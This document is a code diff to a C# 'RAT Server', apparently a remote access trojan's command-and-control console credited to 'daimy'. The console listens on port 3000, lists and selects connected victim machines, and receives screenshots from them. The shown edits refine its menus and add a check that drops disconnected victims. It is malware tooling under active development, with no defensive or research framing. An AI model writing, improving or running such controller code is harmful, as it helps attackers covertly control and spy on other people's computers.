@@ -14,24 +14,29 @@ class RATServer
         int listenPort = 3000;
         TcpListener listener = new TcpListener(IPAddress.Any, listenPort);
         listener.Start();
-        Console.WriteLine("[+] Starting up");
-        Console.WriteLine("[+] Listening for incoming connections on port " + listenPort);
+        Console.WriteLine("\n[+] RAT Server Started");
+        Console.WriteLine("[+] Listening on port " + listenPort);
 
         Thread acceptThread = new Thread(() => AcceptConnections(listener));
         acceptThread.Start();
 
+        MainMenu(listener);
+    }
+
+    static void MainMenu(TcpListener listener)
+    {
         while (true)
         {
             Console.Clear();
-            Console.WriteLine("=== RAT Server ===");
-            Console.WriteLine("-- made by daimy --");
+            Console.WriteLine("\n====================");
+            Console.WriteLine("  RAT SERVER - DAIMY  ");
+            Console.WriteLine("====================");
             Console.WriteLine("1. List Clients");
             Console.WriteLine("2. Interact with Client");
             Console.WriteLine("3. Exit");
             Console.Write("Select an option: ");
 
-            string choice = Console.ReadLine();
-            switch (choice)
+            switch (Console.ReadLine())
             {
                 case "1":
                     ListClients();
@@ -41,6 +46,7 @@ class RATServer
                     break;
                 case "3":
                     listener.Stop();
+                    Console.WriteLine("Exiting...");
                     return;
                 default:
                     Console.WriteLine("Invalid option. Press Enter to continue.");
@@ -67,24 +73,29 @@ class RATServer
 
     static void ListClients()
     {
+        Console.Clear();
+        Console.WriteLine("\nConnected Clients:");
+
+        clients.RemoveAll(client => !client.IsConnected());
+
         if (clients.Count == 0)
         {
             Console.WriteLine("No clients connected.");
         }
         else
         {
-            Console.WriteLine("Connected Clients:");
             foreach (var client in clients)
             {
                 Console.WriteLine($"Client ID: {client.ClientID} - {client.ClientIP}");
             }
         }
-        Console.WriteLine("Press Enter to continue.");
+        Console.WriteLine("\nPress Enter to return.");
         Console.ReadLine();
     }
 
     static void InteractWithClient()
     {
+        Console.Clear();
         Console.Write("Enter Client ID to interact with: ");
         if (!int.TryParse(Console.ReadLine(), out int clientID))
         {
@@ -92,6 +103,8 @@ class RATServer
             return;
         }
 
+        clients.RemoveAll(client => !client.IsConnected());
+        
         ClientHandler selectedClient = clients.Find(c => c.ClientID == clientID);
         if (selectedClient == null)
         {
@@ -99,7 +112,7 @@ class RATServer
             return;
         }
 
-        Console.WriteLine($"Interacting with Client {selectedClient.ClientID}. Type 'back' to return to main menu.");
+        Console.WriteLine($"\nInteracting with Client {selectedClient.ClientID}. Type 'back' to return.");
         selectedClient.Interact();
     }
 }
@@ -120,8 +133,7 @@ class ClientHandler
         this.ClientIP = ((IPEndPoint)client.Client.RemoteEndPoint).Address.ToString();
         this.stream = client.GetStream();
         this.reader = new StreamReader(stream);
-        this.writer = new StreamWriter(stream);
-        writer.AutoFlush = true;
+        this.writer = new StreamWriter(stream) { AutoFlush = true };
     }
 
     public void HandleClient()
@@ -142,7 +154,7 @@ class ClientHandler
             string line;
             while (!string.IsNullOrWhiteSpace(line = reader.ReadLine()))
             {
-                //Console.WriteLine($"[Client {ClientID}] Received: {line}"); 
+                // Console.WriteLine($"[Client {ClientID}] Received: {line}");
             }
 
             while (true)
@@ -153,8 +165,6 @@ class ClientHandler
                     Console.WriteLine($"[Client {ClientID}] Disconnected.");
                     break;
                 }
-
-                // Console.WriteLine($"[Client {ClientID}] Received: {line}");
 
                 if (line.StartsWith("[SCREENSHOT]"))
                 {
@@ -185,6 +195,17 @@ class ClientHandler
         }
     }
 
+    public bool IsConnected()
+    {
+        try
+        {
+            return !(client.Client.Poll(1, SelectMode.SelectRead) && client.Client.Available == 0);
+        }
+        catch
+        {
+            return false;
+        }
+    }
 
     public void Interact()
     {
